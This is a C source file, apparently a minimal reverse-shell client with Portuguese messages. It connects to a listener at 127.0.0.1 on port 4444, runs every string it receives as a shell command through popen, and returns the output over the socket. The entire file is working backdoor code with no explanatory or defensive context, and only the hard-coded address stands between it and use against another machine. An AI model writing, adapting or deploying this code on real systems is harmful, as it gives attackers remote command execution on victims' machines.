#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>

#define PORT 4444
#define MAX_SIZE 1024

int main(){
    int sockFD, valueRead;
    struct sockaddr_in clientAddr;
    char buffer[256];
    char sendMsg[1024];
    char recvMsg[1024];
    socklen_t addrlenClient = sizeof(clientAddr);
    fd_set readFDs;

    sockFD = socket(AF_INET, SOCK_STREAM, 0);
    if(sockFD < 0){
        printf("[ERRO]: Erro ao criar o socket!");
        return 1;
    }

    memset(&clientAddr, 0, addrlenClient);
    clientAddr.sin_family = AF_INET;
    clientAddr.sin_port = htons(PORT);
    if(inet_pton(AF_INET, "127.0.0.1", &clientAddr.sin_addr) < 0){
        printf("[ERRO] Erro ao converter o endereço!");
        return 1;
    }

    if(connect(sockFD, (struct sockaddr *) &clientAddr, sizeof(clientAddr)) < 0){
        printf("[ERRO]: Erro ao realizar a conexão!");
        return 1;
    }

    printf("Conectado ao servidor!\n[IP]: %s\n[PORTA]: %d\n\n", inet_ntoa(clientAddr.sin_addr), PORT);

    while(1){
        memset(recvMsg, 0, sizeof(recvMsg));
        memset(sendMsg, 0, sizeof(sendMsg));

        if((valueRead = recv(sockFD, recvMsg, sizeof(recvMsg) -1, 0)) < 0){
            printf("[ERRO] Erro ao receber a mensagem!");
            break;
        }

        if(valueRead == 0){
            printf("\r\033[K\nServer desconectado\n");
            printf("Saindo...\n");
            break;
        }

        if(valueRead > 0){
            printf("\r\033[K[SERVER]: %s\n", recvMsg);
        }

        FILE* pipe = popen(recvMsg, "r");
        if (pipe == NULL) {
            printf("[ERRO]: Erro ao executar comando!");
            strcpy(sendMsg, "[ERRO]: Erro ao executar comando!\0");
            if(send(sockFD, sendMsg, strlen(sendMsg), 0) < 0){
                printf("[ERRO]: Erro ao enviar o conteúdo!");
            }
            return 1;
        }

        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
            snprintf(sendMsg + strlen(sendMsg), sizeof(sendMsg) - strlen(sendMsg), "%s", buffer);
        }

        pclose(pipe);

        if(send(sockFD, sendMsg, strlen(sendMsg), 0) < 0){
            printf("[ERRO]: Erro ao enviar o conteúdo!");
            return 1;
        }

    }

    close(sockFD);
    return 0;
}
